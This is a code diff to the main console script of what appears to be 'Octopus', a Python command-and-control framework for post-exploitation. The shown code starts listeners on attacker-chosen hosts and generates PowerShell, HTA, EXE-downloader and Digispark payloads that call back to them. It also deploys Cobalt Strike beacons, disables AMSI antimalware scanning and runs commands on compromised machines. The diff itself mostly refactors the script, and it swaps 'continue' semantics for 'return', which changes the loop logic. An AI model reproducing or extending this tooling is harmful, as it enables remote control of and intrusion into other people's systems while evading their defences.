@@ -15,8 +15,10 @@ from termcolor import colored
 from core.functions import *
 from core.weblistener import *
 #from flask import *
+
+
 @app.route("/webinterface", methods=["POST","GET"])
-def panel():
+def webinterface():
     if request.method == 'POST':
         old_stdout = sys.stdout
         stdout = io.StringIO()
@@ -115,11 +117,15 @@ if python_version != 3:
     print(colored("[-] Please run Octopus with python 3", "red"))
     sys.exit()
 
-listener = NewListener("startup","0.0.0.0",os.environ["PORT"], "0.0.0.0","1","r");listener.start_listener();listener.create_path();listeners=listener
 
+listener = NewListener("startup","0.0.0.0",os.environ["PORT"], "0.0.0.0","1","r");
+listener.start_listener();
+listener.create_path();
+listeners=listener
 listeners=NewListener()
+
 def ctrlc(sig, frame):
-    pass
+    return
 
 signal.signal(signal.SIGINT, ctrlc)
 if not os.path.isfile(".oct_history"):
@@ -130,6 +136,7 @@ else:
 banner()
 
 def run(command):
+    global listeners
     # readline.set_completer(completer)
     # readline.parse_and_bind("tab: complete")
     # readline.write_history_file(".oct_history")
@@ -155,7 +162,7 @@ def run(command):
                 delete(session[2], int(command.split(" ")[1]))
             except:
                 print(colored("[-] Wrong listener selected !", "red"))
-                pass #continue
+                return #continue
 
 
         if command == "clear":
@@ -171,7 +178,7 @@ def run(command):
                 print(colored("[-] Please select a listener !", "red"))
                 print(colored("Syntax :  generate_powershell listener_name", "green"))
                 print(colored("Example : generate_powershell listener1", "yellow"))
-                pass #continue
+                return #continue
 
             try:
                 hostname = listeners_information[listener][3]+":"+str(listeners_information[listener][2])
@@ -188,7 +195,7 @@ def run(command):
                 generate(hostname, path, proto_to_use, interval)
             except KeyError:
                 print(colored("[-] Wrong listener selected !", "red"))
-                pass #continue
+                return #continue
 
         if command.split(" ")[0] == "delete_listener":
             try:
@@ -202,7 +209,7 @@ def run(command):
 
             except:
                 print(colored("[-] Wrong listener selected !", "red"))
-                pass #continue
+                return #continue
 
 
         if command.split(" ")[0] == "generate_hta":
@@ -212,7 +219,7 @@ def run(command):
                 print(colored("[-] Please select a listener !", "red"))
                 print(colored("Syntax :  generate_hta listener_name", "green"))
                 print(colored("Example : generate_hta listener1", "yellow"))
-                pass #continue
+                return #continue
 
             try:
                 host_ip = listeners_information[listener][3]
@@ -229,7 +236,7 @@ def run(command):
                 generate_hta(host_ip,bind_port,proto_to_use)
             except KeyError:
                 print(colored("[-] Wrong listener selected !", "red"))
-                pass #continue
+                return #continue
 
         if command.split(" ")[0] == "generate_unmanaged_exe":
             try:
@@ -239,7 +246,7 @@ def run(command):
                 print(colored("[-] Please select a listener and check your options !", "red"))
                 print(colored("Syntax :  generate_unmanaged_exe listener_name output_path", "green"))
                 print(colored("Example : generate_unmanaged_exe listener1 /opt/Octopus/file.exe", "yellow"))
-                pass #continue
+                return #continue
 
             try:
                 hostname = listeners_information[listener][3]+":"+str(listeners_information[listener][2])
@@ -255,7 +262,7 @@ def run(command):
                 generate_exe_powershell_downloader(hostname, path, proto_to_use, exe_path)
             except KeyError:
                 print(colored("[-] Wrong listener selected !", "red"))
-                pass #continue
+                return #continue
 
 # generate_digispark
         if command.split(" ")[0] == "generate_digispark":
@@ -266,7 +273,7 @@ def run(command):
                 print(colored("[-] Please select a listener and check your options !", "red"))
                 print(colored("Syntax :  generate_digispark listener_name output_path", "green"))
                 print(colored("Example : generate_digispark listener1 /opt/Octopus/file.ino", "yellow"))
-                pass #continue
+                return #continue
 
             try:
                 hostname = listeners_information[listener][3]+":"+str(listeners_information[listener][2])
@@ -282,7 +289,7 @@ def run(command):
                 generate_digispark(hostname, path, proto_to_use, ino_path)
             except KeyError:
                 print(colored("[-] Wrong listener selected !", "red"))
-                pass #continue
+                return #continue
 
 
         if command.split(" ")[0] == "interact":
@@ -293,12 +300,12 @@ def run(command):
                     session = connections_information[int(command.split(" ")[1])]
                 except:
                     print(colored("[-] Error interacting with host", "red"))
-                    pass #continue
+                    return #continue
                 while True:
                     try:
                         scommand = input("(%s) >> " % colored(session[2], "red"))
                         if scommand == "":
-                            pass #continue
+                            return #continue
                         elif scommand == "exit" or scommand == "back":
                             break
                         elif scommand == "help":
@@ -308,12 +315,12 @@ def run(command):
 
                         elif scommand == "modules":
                             list_modules()
-                            pass
+                            return
                         elif scommand.split(" ")[0] == "load":
                             try:
                                 module_name = scommand.split(" ")[1]
                                 load_module(session[2], module_name)
-                                pass
+                                return
                             except IndexError:
                                 print(colored("[+] Please select a module !"))
 
@@ -321,13 +328,13 @@ def run(command):
                             try:
                                 beacon_path = scommand.split(" ")[1]
                                 deploy_cobalt_beacon(session[2], beacon_path)
-                                pass
+                                return
                             except IndexError:
                                 print(colored("[+] Please select a valid beacon path!", "red"))
 
                         elif scommand == "disable_amsi":
                             disable_amsi(session[2])
-                            pass
+                            return
                         else:
                             send_command(session[2], scommand)
                     except:
@@ -341,13 +348,13 @@ def run(command):
                     port = int(command.split(" ")[2])
                 except ValueError:
                     print(colored("[-] port should be number !", "red"))
-                    pass #continue
+                    return #continue
                 host = command.split(" ")[3]
                 try:
                     interval = int(command.split(" ")[4])
                 except ValueError:
                     print(colored("[-] interval should be number !", "red"))
-                    pass #continue
+                    return #continue
                 path = command.split(" ")[5]
                 listener_name = command.split(" ")[6]
                 if check_listener_name(listener_name):
@@ -383,7 +390,7 @@ def run(command):
                 print(colored("Example (without domain) : listen_http 0.0.0.0 8080 172.0.1.3 5 profile.php op1_listener", "yellow"))
                 http_help_banner()
 
-                pass #continue
+                return #continue
 
         elif command.split(" ")[0] == "listen_https":
             try:
@@ -393,13 +400,13 @@ def run(command):
                     port = int(command.split(" ")[2])
                 except ValueError:
                     print(colored("[-] port should be number !", "red"))
-                    pass #continue
+                    return #continue
                 host = command.split(" ")[3]
                 try:
                     interval = int(command.split(" ")[4])
                 except ValueError:
                     print(colored("[-] interval should be number !", "red"))
-                    pass #continue
+                    return #continue
                 path = command.split(" ")[5]
                 listener_name = command.split(" ")[6]
                 if check_listener_name(listener_name):
@@ -431,7 +438,7 @@ def run(command):
                 print(colored("[-] Please check listener arguments !", "red"))
                 print(colored("Syntax  : listen_https BindIP BindPort hostname interval URL listener_name certficate_path key_path", "green"))
                 print(colored("Example (with domain) : listen_https 0.0.0.0 443 myc2.live 5 login.php op1_listener certs/cert.pem certs/key.pem", "yellow"))
-                pass #continue
+                return #continue
     except EOFError:
         print(" ")
 
